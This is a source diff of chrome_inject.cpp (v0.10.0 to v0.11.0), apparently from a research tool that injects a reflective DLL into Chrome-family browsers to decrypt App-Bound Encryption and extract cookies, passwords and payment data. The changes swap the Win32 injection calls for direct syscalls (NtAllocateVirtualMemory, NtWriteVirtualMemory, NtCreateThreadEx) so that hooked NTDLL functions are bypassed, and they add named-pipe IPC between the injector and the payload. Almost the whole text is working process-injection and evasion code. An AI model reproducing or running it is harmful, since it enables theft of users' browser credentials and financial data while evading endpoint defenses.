@@ -1,5 +1,5 @@
 // chrome_inject.cpp
-// v0.10.0 (c) Alexander 'xaitax' Hagenah
+// v0.11.0 (c) Alexander 'xaitax' Hagenah
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 
 #include <Windows.h>
@@ -17,6 +17,9 @@
 #include <algorithm>
 #include <optional>
 #include <map>
+#include "syscalls.h"
+#include <Rpc.h>
+#pragma comment(lib, "Rpcrt4.lib")
 
 #ifndef IMAGE_FILE_MACHINE_ARM64
 #define IMAGE_FILE_MACHINE_ARM64 0xAA64
@@ -25,14 +28,10 @@
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "version.lib")
 
-const WCHAR *COMPLETION_EVENT_NAME_INJECTOR = L"Global\\ChromeDecryptWorkDoneEvent";
-const char *SESSION_CONFIG_FILE_NAME_INJECTOR = "chrome_decrypt_session.cfg";
-
 constexpr DWORD DLL_COMPLETION_TIMEOUT_MS = 60000;
 constexpr DWORD BROWSER_INIT_WAIT_MS = 3000;
 constexpr DWORD INJECTOR_REMOTE_THREAD_WAIT_MS = 15000;
 
-typedef LONG NTSTATUS;
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #endif
@@ -58,9 +57,38 @@ std::string WStringToUtf8(std::wstring_view w_sv)
     return utf8_str;
 }
 
+std::wstring GenerateUniquePipeName()
+{
+    UUID uuid;
+    UuidCreate(&uuid);
+    wchar_t *uuidStrRaw = nullptr;
+    if (UuidToStringW(&uuid, (RPC_WSTR *)&uuidStrRaw) != RPC_S_OK)
+    {
+        return L"\\\\.\\pipe\\ChromeDecryptIPC_FallbackErrorName";
+    }
+    std::wstring pipeName = L"\\\\.\\pipe\\ChromeDecryptIPC_";
+    pipeName += uuidStrRaw;
+    RpcStringFreeW((RPC_WSTR *)&uuidStrRaw);
+    return pipeName;
+}
+
+std::string PtrToHexStr(const void *ptr)
+{
+    std::ostringstream oss;
+    oss << "0x" << std::hex << reinterpret_cast<uintptr_t>(ptr);
+    return oss.str();
+}
+
 void print_hex_ptr(std::ostringstream &oss, const void *ptr)
 {
     oss << "0x" << std::hex << reinterpret_cast<uintptr_t>(ptr);
+}
+
+std::string NtStatusToString(NTSTATUS status)
+{
+    std::ostringstream oss;
+    oss << "0x" << std::hex << status;
+    return oss.str();
 }
 
 inline void debug(const std::string &msg)
@@ -251,9 +279,9 @@ void DisplayBanner()
     SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);
     std::cout << "------------------------------------------------" << std::endl;
     std::cout << "|  Chrome App-Bound Encryption Decryption      |" << std::endl;
-    std::cout << "|  Reflective DLL Process Injection            |" << std::endl;
-    std::cout << "|  Cookies / Passwords / Payment Methods       |" << std::endl;
-    std::cout << "|  v0.10.0 by @xaitax                          |" << std::endl;
+    std::cout << "|  Direct Syscall Injection Engine             |" << std::endl;
+    std::cout << "|  x64 & ARM64 | Cookies, Passwords, Payments  |" << std::endl;
+    std::cout << "|  v0.11.0 by @xaitax                          |" << std::endl;
     std::cout << "------------------------------------------------" << std::endl
               << std::endl;
     SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
@@ -273,7 +301,7 @@ void CleanupPreviousRun()
         return;
     }
 
-    const char *files_to_delete[] = {"chrome_decrypt.log", "chrome_appbound_key.txt", SESSION_CONFIG_FILE_NAME_INJECTOR};
+    const char *files_to_delete[] = {"chrome_decrypt.log", "chrome_appbound_key.txt"};
     for (const char *fname : files_to_delete)
     {
         fs::path file_path = tempDir / fname;
@@ -452,9 +480,9 @@ DWORD GetReflectiveLoaderFileOffset(LPVOID lpFileBuffer, USHORT expectedMachine)
     return 0;
 }
 
-bool InjectWithReflectiveLoader(HANDLE proc, const std::string &dllPathUtf8, USHORT targetArch)
+bool InjectWithReflectiveLoader(HANDLE proc, const std::string &dllPathUtf8, USHORT targetArch, LPVOID lpDllParameter)
 {
-    debug("InjectWithReflectiveLoader: begin for DLL: " + dllPathUtf8);
+    debug("InjectWithReflectiveLoader: begin for DLL: " + dllPathUtf8 + ", Param: " + PtrToHexStr(lpDllParameter));
 
     std::ifstream dllFile(dllPathUtf8, std::ios::binary | std::ios::ate);
     if (!dllFile.is_open())
@@ -462,16 +490,16 @@ bool InjectWithReflectiveLoader(HANDLE proc, const std::string &dllPathUtf8, USH
         debug("RDI: Failed to open DLL file: " + dllPathUtf8);
         return false;
     }
-    std::streamsize fileSize = dllFile.tellg();
+    std::streamsize fileSizeStream = dllFile.tellg();
     dllFile.seekg(0, std::ios::beg);
-    std::vector<BYTE> dllBuffer(static_cast<size_t>(fileSize));
-    if (!dllFile.read(reinterpret_cast<char *>(dllBuffer.data()), fileSize))
+    std::vector<BYTE> dllBuffer(static_cast<size_t>(fileSizeStream));
+    if (!dllFile.read(reinterpret_cast<char *>(dllBuffer.data()), fileSizeStream))
     {
         debug("RDI: Failed to read DLL file into buffer.");
         return false;
     }
     dllFile.close();
-    debug("RDI: DLL read into local buffer. Size: " + std::to_string(fileSize) + " bytes.");
+    debug("RDI: DLL read into local buffer. Size: " + std::to_string(fileSizeStream) + " bytes.");
 
     DWORD reflectiveLoaderOffset = GetReflectiveLoaderFileOffset(dllBuffer.data(), targetArch);
     if (reflectiveLoaderOffset == 0)
@@ -483,20 +511,41 @@ bool InjectWithReflectiveLoader(HANDLE proc, const std::string &dllPathUtf8, USH
     oss_rlo << "RDI: ReflectiveLoader file offset: 0x" << std::hex << reflectiveLoaderOffset;
     debug(oss_rlo.str());
 
-    LPVOID remoteMem = VirtualAllocEx(proc, nullptr, dllBuffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!remoteMem)
+    LPVOID remoteMem = nullptr;
+    SIZE_T regionSize = dllBuffer.size();
+    NTSTATUS status_alloc = g_syscall_stubs.NtAllocateVirtualMemory(
+        proc,
+        &remoteMem,
+        0,
+        &regionSize,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE);
+
+    if (!NT_SUCCESS(status_alloc) || !remoteMem)
     {
-        debug("RDI: VirtualAllocEx failed. Error: " + std::to_string(GetLastError()));
+        debug("RDI: NtAllocateVirtualMemory failed. Status: " + NtStatusToString(status_alloc));
         return false;
     }
     std::ostringstream oss_rem;
     print_hex_ptr(oss_rem, remoteMem);
     debug("RDI: Memory allocated in target at " + oss_rem.str() + " (Size: " + std::to_string(dllBuffer.size()) + " bytes)");
 
-    if (!WriteProcessMemory(proc, remoteMem, dllBuffer.data(), dllBuffer.size(), nullptr))
+    SIZE_T bytesWritten = 0;
+    NTSTATUS status_write = g_syscall_stubs.NtWriteVirtualMemory(
+        proc,
+        remoteMem,
+        dllBuffer.data(),
+        dllBuffer.size(),
+        &bytesWritten);
+
+    if (!NT_SUCCESS(status_write) || bytesWritten != dllBuffer.size())
     {
-        debug("RDI: WriteProcessMemory failed. Error: " + std::to_string(GetLastError()));
-        VirtualFreeEx(proc, remoteMem, 0, MEM_RELEASE);
+        debug("RDI: NtWriteVirtualMemory failed. Status: " + NtStatusToString(status_write) +
+              ", Bytes written: " + std::to_string(bytesWritten));
+
+        SIZE_T sizeToFree = 0;
+        PVOID baseAddressToFree = remoteMem;
+        g_syscall_stubs.NtFreeVirtualMemory(proc, &baseAddressToFree, &sizeToFree, MEM_RELEASE);
         return false;
     }
     debug("RDI: DLL written to target memory.");
@@ -506,13 +555,31 @@ bool InjectWithReflectiveLoader(HANDLE proc, const std::string &dllPathUtf8, USH
     oss_rla << "RDI: Calculated remote ReflectiveLoader address: 0x" << std::hex << remoteLoaderAddr;
     debug(oss_rla.str());
 
-    HandleGuard th(CreateRemoteThread(proc, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteLoaderAddr, nullptr, 0, nullptr), "RemoteReflectiveLoaderThread");
-    if (!th)
+    HANDLE hRemoteThread = nullptr;
+    NTSTATUS status_thread = g_syscall_stubs.NtCreateThreadEx(
+        &hRemoteThread,
+        THREAD_ALL_ACCESS,
+        nullptr,
+        proc,
+        (LPTHREAD_START_ROUTINE)remoteLoaderAddr,
+        lpDllParameter,
+        0,
+        0,
+        0,
+        0,
+        nullptr);
+
+    HandleGuard th(nullptr, "RemoteReflectiveLoaderThread_Syscall");
+    if (!NT_SUCCESS(status_thread) || !hRemoteThread)
     {
-        debug("RDI: CreateRemoteThread for ReflectiveLoader failed. Error: " + std::to_string(GetLastError()));
-        VirtualFreeEx(proc, remoteMem, 0, MEM_RELEASE);
+        debug("RDI: NtCreateThreadEx for ReflectiveLoader failed. Status: " + NtStatusToString(status_thread));
+        SIZE_T sizeToFree = 0;
+        PVOID baseAddressToFree = remoteMem;
+        g_syscall_stubs.NtFreeVirtualMemory(proc, &baseAddressToFree, &sizeToFree, MEM_RELEASE);
         return false;
     }
+    th.reset(hRemoteThread);
+
     debug("RDI: Waiting for remote ReflectiveLoader thread to complete (max " + std::to_string(INJECTOR_REMOTE_THREAD_WAIT_MS / 1000) + "s)...");
     DWORD wait_res = WaitForSingleObject(th.get(), INJECTOR_REMOTE_THREAD_WAIT_MS);
 
@@ -580,9 +647,48 @@ void PrintUsage()
 int wmain(int argc, wchar_t *argv[])
 {
     DisplayBanner();
+
+    bool is_verbose = false;
+    for (int i = 1; i < argc; ++i)
+    {
+        std::wstring_view arg = argv[i];
+        if (arg == L"--verbose" || arg == L"-v")
+        {
+            is_verbose = true;
+            break;
+        }
+    }
+
+    if (!InitializeSyscalls(is_verbose))
+    {
+        print_status("[-]", "Failed to initialize syscalls. Critical NTDLL functions might be hooked or missing.");
+        return 1;
+    }
+
+    std::wstring ipcPipeNameW = GenerateUniquePipeName();
+    std::string ipcPipeNameA = WStringToUtf8(ipcPipeNameW);
+    if (verbose)
+        debug("Generated IPC Pipe Name: " + ipcPipeNameA);
+
+    HandleGuard namedPipeHandle(CreateNamedPipeW(
+                                    ipcPipeNameW.c_str(),
+                                    PIPE_ACCESS_DUPLEX,
+                                    PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
+                                    1, 4096, 4096, 0, nullptr),
+                                "NamedPipeServer");
+
+    if (!namedPipeHandle)
+    {
+        print_status("[-]", "CreateNamedPipeW failed. Error: " + std::to_string(GetLastError()));
+        return 1;
+    }
+    if (verbose)
+        debug("Named pipe server created: " + ipcPipeNameA);
+
     bool autoStartBrowser = false;
     bool browserSuccessfullyStartedByInjector = false;
     std::wstring browserTypeArg;
+    LPVOID remotePipeNameAddr = nullptr;
 
     debug("wmain: parsing arguments");
     for (int i = 1; i < argc; ++i)
@@ -650,40 +756,6 @@ int wmain(int argc, wchar_t *argv[])
         }
         debug("Created output directory: " + resolvedOutputPath.u8string());
     }
-
-    fs::path configFilePath;
-    try
-    {
-        configFilePath = fs::temp_directory_path() / SESSION_CONFIG_FILE_NAME_INJECTOR;
-    }
-    catch (const fs::filesystem_error &e)
-    {
-        print_status("[-]", "Failed to get temp directory path: " + std::string(e.what()));
-        return 1;
-    }
-    debug("Writing session config to: " + configFilePath.u8string());
-    {
-        std::ofstream configFileOut(configFilePath, std::ios::trunc | std::ios::binary);
-        if (configFileOut)
-        {
-            std::string outputPathUtf8 = resolvedOutputPath.u8string();
-            configFileOut.write(outputPathUtf8.c_str(), outputPathUtf8.length());
-        }
-        else
-        {
-            print_status("[-]", "Failed to write session config file: " + configFilePath.u8string());
-            return 1;
-        }
-    }
-
-    HandleGuard completionEvent(CreateEventW(NULL, TRUE, FALSE, COMPLETION_EVENT_NAME_INJECTOR), "CompletionEvent");
-    if (!completionEvent)
-    {
-        print_status("[-]", "Failed to create completion event. Error: " + std::to_string(GetLastError()));
-        return 1;
-    }
-    debug("Created completion event: " + WStringToUtf8(COMPLETION_EVENT_NAME_INJECTOR));
-    ResetEvent(completionEvent.get());
 
     auto browserIt = browserConfigMap.find(browserTypeArg);
     if (browserIt == browserConfigMap.end())
@@ -765,82 +837,204 @@ int wmain(int argc, wchar_t *argv[])
     if (!CheckArchMatch(targetProcessHandle.get()))
         return 1;
 
+    SIZE_T pipeNameSizeInBytes = (ipcPipeNameW.length() + 1) * sizeof(wchar_t);
+    NTSTATUS status_alloc_pipename = g_syscall_stubs.NtAllocateVirtualMemory(
+        targetProcessHandle.get(), &remotePipeNameAddr, 0, &pipeNameSizeInBytes,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    if (!NT_SUCCESS(status_alloc_pipename) || !remotePipeNameAddr)
+    {
+        print_status("[-]", "NtAllocateVirtualMemory for pipe name in target failed. Status: " + NtStatusToString(status_alloc_pipename));
+        return 1;
+    }
+    if (verbose)
+        debug("Memory for pipe name allocated in target at " + PtrToHexStr(remotePipeNameAddr));
+
+    SIZE_T bytesWrittenPipeName = 0;
+    NTSTATUS status_write_pipename = g_syscall_stubs.NtWriteVirtualMemory(
+        targetProcessHandle.get(), remotePipeNameAddr, (PVOID)ipcPipeNameW.c_str(),
+        pipeNameSizeInBytes, &bytesWrittenPipeName);
+
+    if (!NT_SUCCESS(status_write_pipename) || bytesWrittenPipeName != pipeNameSizeInBytes)
+    {
+        print_status("[-]", "NtWriteVirtualMemory for pipe name in target failed. Status: " + NtStatusToString(status_write_pipename));
+        SIZE_T sizeToFree = 0;
+        g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &sizeToFree, MEM_RELEASE);
+        remotePipeNameAddr = nullptr;
+        return 1;
+    }
+    if (verbose)
+        debug("Pipe name written to target memory.");
+
     std::string dllPathUtf8 = GetPayloadDllPathUtf8();
     if (dllPathUtf8.empty() || !fs::exists(dllPathUtf8))
     {
         print_status("[-]", "chrome_decrypt.dll not found. Expected near injector: " + (dllPathUtf8.empty() ? "<Error determining path>" : dllPathUtf8));
+        if (remotePipeNameAddr)
+        {
+            SIZE_T stf = 0;
+            g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &stf, MEM_RELEASE);
+        }
         return 1;
     }
 
     bool injectedSuccessfully = false;
-    std::string usedInjectionMethodDesc = "Reflective DLL Injection (RDI)";
+    std::string usedInjectionMethodDesc = "Reflective DLL Injection (RDI with Syscalls)";
 
-    injectedSuccessfully = InjectWithReflectiveLoader(targetProcessHandle.get(), dllPathUtf8, currentTargetArch);
+    injectedSuccessfully = InjectWithReflectiveLoader(targetProcessHandle.get(), dllPathUtf8, currentTargetArch, remotePipeNameAddr);
 
     if (!injectedSuccessfully)
     {
         print_status("[-]", "DLL injection failed via " + usedInjectionMethodDesc);
+        if (remotePipeNameAddr)
+        {
+            SIZE_T sizeToFree = 0;
+            g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &sizeToFree, MEM_RELEASE);
+        }
         return 1;
     }
     print_status("[+]", "DLL injected via " + usedInjectionMethodDesc);
 
-    print_status("[*]", "Waiting for DLL decryption tasks to complete (max " + std::to_string(DLL_COMPLETION_TIMEOUT_MS / 1000) + "s)...");
-    DWORD waitResult = WaitForSingleObject(completionEvent.get(), DLL_COMPLETION_TIMEOUT_MS);
-
-    if (waitResult == WAIT_OBJECT_0)
-        print_status("[+]", "DLL signaled completion.");
-    else if (waitResult == WAIT_TIMEOUT)
-        print_status("[-]", "Timeout waiting for DLL completion. Log may be incomplete or DLL failed.");
-    else
-        print_status("[-]", "Error waiting for DLL completion event: " + std::to_string(GetLastError()));
-
-    fs::path logFilePathFull;
-    try
+    if (verbose)
+        debug("Waiting for DLL to connect to named pipe: " + ipcPipeNameA);
+    if (!ConnectNamedPipe(namedPipeHandle.get(), nullptr) && GetLastError() != ERROR_PIPE_CONNECTED)
     {
-        logFilePathFull = fs::temp_directory_path() / "chrome_decrypt.log";
-    }
-    catch (const fs::filesystem_error &e)
-    {
-        print_status("[-]", "Failed to get temp path for log file: " + std::string(e.what()));
-    }
-
-    if (!logFilePathFull.empty() && fs::exists(logFilePathFull))
-    {
-        debug("Attempting to display log file: " + logFilePathFull.u8string());
-        std::ifstream ifs(logFilePathFull);
-        if (ifs.is_open())
+        print_status("[-]", "ConnectNamedPipe failed. Error: " + std::to_string(GetLastError()));
+        if (remotePipeNameAddr)
         {
-            std::string line;
-            CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
-            HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
-            WORD originalAttributes = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE;
-            if (GetConsoleScreenBufferInfo(hStdOut, &consoleInfo))
+            SIZE_T sizeToFree = 0;
+            g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &sizeToFree, MEM_RELEASE);
+        }
+        return 1;
+    }
+    if (verbose)
+        debug("DLL connected to named pipe.");
+
+    std::string verboseStatusMsg = verbose ? "VERBOSE_TRUE" : "VERBOSE_FALSE";
+    DWORD bytesWrittenVerboseStatus = 0;
+    if (!WriteFile(namedPipeHandle.get(), verboseStatusMsg.c_str(), verboseStatusMsg.length() + 1, &bytesWrittenVerboseStatus, nullptr) ||
+        bytesWrittenVerboseStatus != (verboseStatusMsg.length() + 1))
+    {
+        print_status("[-]", "WriteFile to pipe (sending verbose status) failed. Error: " + std::to_string(GetLastError()));
+        if (remotePipeNameAddr)
+        {
+            SIZE_T stf = 0;
+            g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &stf, MEM_RELEASE);
+        }
+        return 1;
+    }
+    if (verbose)
+        debug("Verbose status (" + verboseStatusMsg + ") sent to DLL.");
+
+    std::string outputPathUtf8_pipe = resolvedOutputPath.u8string();
+    DWORD bytesWrittenToPipe = 0;
+    if (!WriteFile(namedPipeHandle.get(), outputPathUtf8_pipe.c_str(), outputPathUtf8_pipe.length() + 1, &bytesWrittenToPipe, nullptr) ||
+        bytesWrittenToPipe != (outputPathUtf8_pipe.length() + 1))
+    {
+        print_status("[-]", "WriteFile to pipe (sending output path) failed. Error: " + std::to_string(GetLastError()));
+        if (remotePipeNameAddr)
+        {
+            SIZE_T stf = 0;
+            g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &stf, MEM_RELEASE);
+        }
+        return 1;
+    }
+    if (verbose)
+        debug("Output path sent to DLL: " + outputPathUtf8_pipe);
+
+    print_status("[*]", "Waiting for DLL (Pipe: " + ipcPipeNameA + "");
+
+    std::string accumulatedPipeData;
+    char pipeBuffer[4096];
+    DWORD bytesReadFromPipe = 0;
+    bool dllCompleted = false;
+    const std::string dllCompletionSignal = "__DLL_PIPE_COMPLETION_SIGNAL__";
+    DWORD startTime = GetTickCount();
+
+    HANDLE hStdOutConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+    CONSOLE_SCREEN_BUFFER_INFO consoleInfoOriginal;
+    WORD originalConsoleAttributes = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE;
+    if (GetConsoleScreenBufferInfo(hStdOutConsole, &consoleInfoOriginal))
+    {
+        originalConsoleAttributes = consoleInfoOriginal.wAttributes;
+    }
+    std::cout << std::endl;
+
+    while (true)
+    {
+        if (GetTickCount() - startTime > DLL_COMPLETION_TIMEOUT_MS)
+        {
+            print_status("[-]", "Timeout waiting for DLL completion via pipe.");
+            break;
+        }
+
+        DWORD bytesAvailable = 0;
+        if (!PeekNamedPipe(namedPipeHandle.get(), nullptr, 0, nullptr, &bytesAvailable, nullptr))
+        {
+            if (GetLastError() == ERROR_BROKEN_PIPE)
             {
-                originalAttributes = consoleInfo.wAttributes;
+                if (verbose)
+                    debug("PeekNamedPipe: Pipe broken. DLL may have exited prematurely.");
+                dllCompleted = true;
             }
-            std::cout << std::endl;
-            while (std::getline(ifs, line))
+            else
             {
-                if (line.find("[+] Terminated process:") != std::string::npos && !verbose)
+                print_status("[-]", "PeekNamedPipe failed. Error: " + std::to_string(GetLastError()));
+            }
+            break;
+        }
+
+        if (bytesAvailable == 0)
+        {
+            Sleep(100);
+            continue;
+        }
+
+        if (ReadFile(namedPipeHandle.get(), pipeBuffer, sizeof(pipeBuffer) - 1, &bytesReadFromPipe, nullptr) && bytesReadFromPipe > 0)
+        {
+            pipeBuffer[bytesReadFromPipe] = '\0';
+            accumulatedPipeData.append(pipeBuffer, bytesReadFromPipe);
+
+            size_t messageStartPos = 0;
+            size_t nullTerminatorPos;
+
+            while ((nullTerminatorPos = accumulatedPipeData.find('\0', messageStartPos)) != std::string::npos)
+            {
+                std::string message = accumulatedPipeData.substr(messageStartPos, nullTerminatorPos - messageStartPos);
+                messageStartPos = nullTerminatorPos + 1;
+
+                if (message == dllCompletionSignal)
                 {
-                    continue;
+                    dllCompleted = true;
+                    if (verbose)
+                        debug("DLL completion signal received via pipe.");
+                    break;
                 }
-                size_t currentPos = 0;
-                while (currentPos < line.length())
+
+                if (message.empty())
+                    continue;
+
+                size_t printPos = 0;
+                while (printPos < message.length())
                 {
-                    size_t tagStartPos = line.find('[', currentPos);
-                    SetConsoleTextAttribute(hStdOut, originalAttributes);
-                    std::cout << line.substr(currentPos, tagStartPos - currentPos);
-                    if (tagStartPos == std::string::npos)
-                        break;
-                    size_t tagEndPos = line.find(']', tagStartPos);
-                    if (tagEndPos == std::string::npos)
+                    size_t tagStart = message.find('[', printPos);
+                    SetConsoleTextAttribute(hStdOutConsole, originalConsoleAttributes);
+                    std::cout << message.substr(printPos, tagStart - printPos);
+
+                    if (tagStart == std::string::npos)
                     {
-                        std::cout << line.substr(tagStartPos);
                         break;
                     }
-                    std::string tag = line.substr(tagStartPos, tagEndPos - tagStartPos + 1);
-                    WORD currentTagColor = originalAttributes;
+
+                    size_t tagEnd = message.find(']', tagStart);
+                    if (tagEnd == std::string::npos)
+                    {
+                        std::cout << message.substr(tagStart);
+                        break;
+                    }
+
+                    std::string tag = message.substr(tagStart, tagEnd - tagStart + 1);
+                    WORD currentTagColor = originalConsoleAttributes;
                     if (tag == "[+]")
                         currentTagColor = FOREGROUND_GREEN | FOREGROUND_INTENSITY;
                     else if (tag == "[-]")
@@ -849,19 +1043,64 @@ int wmain(int argc, wchar_t *argv[])
                         currentTagColor = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
                     else if (tag == "[!]")
                         currentTagColor = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
-                    SetConsoleTextAttribute(hStdOut, currentTagColor);
+                    SetConsoleTextAttribute(hStdOutConsole, currentTagColor);
                     std::cout << tag;
-                    currentPos = tagEndPos + 1;
+                    printPos = tagEnd + 1;
                 }
-                SetConsoleTextAttribute(hStdOut, originalAttributes);
+                SetConsoleTextAttribute(hStdOutConsole, originalConsoleAttributes);
                 std::cout << std::endl;
             }
-            ifs.close();
+
+            if (dllCompleted)
+                break;
+
+            accumulatedPipeData.erase(0, messageStartPos);
         }
         else
         {
-            debug("Log file not found or could not be opened: " + logFilePathFull.u8string());
-            print_status("[!]", "Log file from DLL was not found or is empty.");
+            DWORD lastError = GetLastError();
+            if (lastError == ERROR_BROKEN_PIPE)
+            {
+                if (verbose)
+                    debug("ReadFile: Pipe broken. DLL may have exited.");
+                dllCompleted = true;
+            }
+            else if (lastError != ERROR_NO_DATA && lastError != ERROR_IO_PENDING)
+            {
+                print_status("[-]", "ReadFile from pipe failed. Error: " + std::to_string(lastError));
+            }
+            if (dllCompleted)
+                break;
+        }
+    }
+
+    if (dllCompleted && (GetLastError() != ERROR_BROKEN_PIPE || verbose))
+    {
+        if (GetLastError() != ERROR_BROKEN_PIPE || accumulatedPipeData.empty())
+        {
+            print_status("[+]", "DLL signaled completion or pipe interaction ended.");
+        }
+        else if (GetLastError() == ERROR_BROKEN_PIPE && !accumulatedPipeData.empty())
+        {
+            if (verbose)
+                debug("Pipe broke but there might be unprocessed data: " + accumulatedPipeData);
+        }
+    }
+    else if (!dllCompleted && GetLastError() != ERROR_BROKEN_PIPE)
+    {
+    }
+
+    if (remotePipeNameAddr)
+    {
+        SIZE_T sizeToFree = 0;
+        NTSTATUS free_status = g_syscall_stubs.NtFreeVirtualMemory(targetProcessHandle.get(), &remotePipeNameAddr, &sizeToFree, MEM_RELEASE);
+        if (NT_SUCCESS(free_status) && verbose)
+        {
+            debug("Freed pipe name memory in target process.");
+        }
+        else if (verbose && !NT_SUCCESS(free_status))
+        {
+            debug("Failed to free pipe name memory in target process. Status: " + NtStatusToString(free_status) + ", Error: " + std::to_string(GetLastError()));
         }
     }
 
@@ -882,19 +1121,6 @@ int wmain(int argc, wchar_t *argv[])
     else
     {
         debug("Browser was already running; injector will not terminate it.");
-    }
-
-    std::error_code ec_remove_cfg_end;
-    if (!configFilePath.empty() && fs::exists(configFilePath))
-    {
-        if (!fs::remove(configFilePath, ec_remove_cfg_end))
-        {
-            debug("Failed to clean up session config file: " + configFilePath.u8string() + ". Error: " + ec_remove_cfg_end.message());
-        }
-        else
-        {
-            debug("Cleaned up session config file: " + configFilePath.u8string());
-        }
     }
 
     debug("Injector finished.");
